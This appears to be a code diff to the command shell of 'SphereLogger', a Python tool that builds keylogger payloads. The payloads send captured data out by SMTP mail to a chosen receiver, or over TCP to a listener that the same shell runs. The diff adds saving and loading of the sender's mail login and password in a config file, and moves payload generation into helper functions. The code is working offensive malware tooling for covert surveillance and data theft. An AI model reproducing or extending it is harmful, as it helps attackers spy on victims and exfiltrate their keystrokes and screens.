@@ -1,13 +1,14 @@
 # -*- coding: utf-8 -*-
 
 from SPLib import c_blue, c_green, c_magenta, c_red, c_yellow, \
-    logo, send_test_mail, template_txt, Listener, tcp_template_txt
+    logo, send_test_mail, Listener, generate_mail, \
+    generate_tcp, get_end, get_green
+
 
 from socket import gethostname, gethostbyname
 
 import cmd
 import prettytable
-import time
 
 
 class SphereShell(cmd.Cmd):
@@ -17,10 +18,12 @@ class SphereShell(cmd.Cmd):
     nohelp = 'No help on "%s"'
     license = 'https://github.com/Emberium/SphereLogger'
 
-    def __init__(self):
-        print(c_yellow(logo))
-        print(c_magenta('Welcome to SphereLogger! Type help to get available commands!'))
+    def __init__(self, config=None):
 
+        print(c_yellow(logo))
+        print(c_magenta('Welcome to SphereLogger! Type "help" to get available commands!'))
+
+        self.config = config
         self.listener = None
         self.payload_types = ['mail', 'tcp']
 
@@ -29,11 +32,11 @@ class SphereShell(cmd.Cmd):
     def do_help(self, arg):
         """List available commands with "help" or detailed help with "help cmd"."""
 
-        print('\033[1;32m', end='')
+        print(get_green(), end='')
         super().do_help(arg)
-        print('\033[0m', end='')
+        print(get_end(), end='')
 
-    def do_license(self, t):
+    def do_license(self, line):
         """Shows licence."""
         print(c_blue("License on " + self.license))
 
@@ -57,7 +60,7 @@ class SphereShell(cmd.Cmd):
                 print(c_green('Starting listener...'))
                 self.listener = Listener(int(port))
 
-    def do_read(self, l):
+    def do_read(self, line):
         """Reads connection."""
 
         if self.listener is None:
@@ -69,7 +72,7 @@ class SphereShell(cmd.Cmd):
         else:
             try:
                 while True:
-                    time.sleep(0.1)
+
                     data = self.listener.listen()
 
                     if data is None:
@@ -125,6 +128,21 @@ class SphereShell(cmd.Cmd):
 
         return True
 
+    def check_config(self):
+
+        login = self.config.get('MAIL', 'Login')
+        password = self.config.get('MAIL', 'Password')
+        server = self.config.get('MAIL', 'Server')
+        port = self.config.get('MAIL', 'Port')
+        receiver = self.config.get('MAIL', 'Receiver')
+
+        if login != 'None' and password != 'None' and server != 'None' and port != 'None' and \
+                        receiver != 'None':
+
+            return login, password, server, port, receiver
+
+        return False
+
     def do_gen(self, line):
         """Generates payload. gen <type>. Allowed types: mail"""
 
@@ -150,32 +168,40 @@ class SphereShell(cmd.Cmd):
             if not (file.endswith('.py') or file.endswith('.pyw')):
                 file += '.pyw'
 
-            with open('templates/tcp-template.py', 'r') as f:
-                template = f.read()
-
-            with open('output/'+file, 'w') as f:
-                f.write(tcp_template_txt.format(
-                    port=port,
-                    host=ip
-                ) + template)
+            generate_tcp(host=ip, port=port, output=file)
 
             print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))
 
         elif line == 'mail':
 
-            addr = input(c_green('Sender mail address: '))
-            password = input(c_green('Sender\'s password: '))
-            server = input(c_green('SMTP Server: '))
-            port = input(c_green('SMTP Port: '))
+            settings = False
+
+            defaults = self.check_config()
+            if defaults:
+                if input(c_green('Do you want to load settings from config? (Y/n): ')).upper() == 'Y':
+                    login, password, server, port, rc = defaults
+                    settings = True
+
+                else:
+                    login = input(c_green('Sender mail address: '))
+                    password = input(c_green('Sender\'s password: '))
+                    server = input(c_green('SMTP Server: '))
+                    port = input(c_green('SMTP Port: '))
+                    rc = input(c_green('Receiver\'s mail address: '))
+
+            else:
+                login = input(c_green('Sender mail address: '))
+                password = input(c_green('Sender\'s password: '))
+                server = input(c_green('SMTP Server: '))
+                port = input(c_green('SMTP Port: '))
+                rc = input(c_green('Receiver\'s mail address: '))
 
             if not port.isdigit():
                 print(c_red('Incorrect port.'))
                 return
 
-            rc = input(c_green('Receiver\'s mail address: '))
-
             if input(c_green('Do you want to send test mail? (Y/n)')).upper() == 'Y':
-                if not send_test_mail(addr, password, server, rc, port):
+                if not send_test_mail(login, password, server, rc, port):
                     print(c_red('Sending Error!'))
                     return
 
@@ -190,18 +216,26 @@ class SphereShell(cmd.Cmd):
             if not (file.endswith('.py') or file.endswith('.pyw')):
                 file += '.pyw'
 
-            with open('templates/mail-screen-logger-template.py' if screen_logger else 'templates/mail-template.py', 'r'
-                      ) as f:
-                template = f.read()
+            generate_mail(
+                login=login,
+                password=password,
+                server=server,
+                port=port,
+                receiver=rc,
+                output=file,
+                screen_logger=screen_logger
+            )
 
-            with open('output/' + file, 'w', encoding='utf-8') as f:
-                f.write(template_txt.format(
-                    login=addr,
-                    password=password,
-                    smtp=server,
-                    port=port,
-                    rec=rc
-                ) + template)
+            if not settings:
+                if input(c_green('Do you want to save settings to config? (Y/n): ')).upper() == 'Y':
+                    self.config.set("MAIL", "Login", login)
+                    self.config.set("MAIL", "Password", password)
+                    self.config.set("MAIL", "Server", server)
+                    self.config.set("MAIL", "Port", port)
+                    self.config.set("MAIL", "Receiver", rc)
+
+                    with open('config.ini', 'w') as config_file:
+                        self.config.write(config_file)
 
             print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))
 
